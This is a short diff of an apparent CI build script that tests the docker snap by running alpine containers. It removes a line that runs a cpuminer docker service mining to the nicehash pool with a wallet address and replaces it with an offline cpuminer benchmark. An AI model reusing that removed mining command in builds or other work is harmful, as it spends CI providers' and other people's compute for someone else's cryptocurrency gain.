@@ -8,4 +8,4 @@ script:
   - sudo snap install docker
   - sudo docker run alpine:latest "echo" "Hello, World"
   - sudo timeout --kill-after=5 --signal=SIGINT 2s docker run alpine:latest "sleep" "20"
-  - sudo timeout --kill-after=5 --signal=SIGINT 15s docker service create --mode=global --name miner alexellis2/cpu-opt:2018-1-2 ./cpuminer -a hodl -o stratum+tcp://hodl.usa.nicehash.com:3352 -u 1M2KME8VBx24RsU3Ed2dEkF9EFghn3jR2o.cloud1
+  - sudo docker run --rm wernight/cpuminer-multi:alpine cpuminer --benchmark
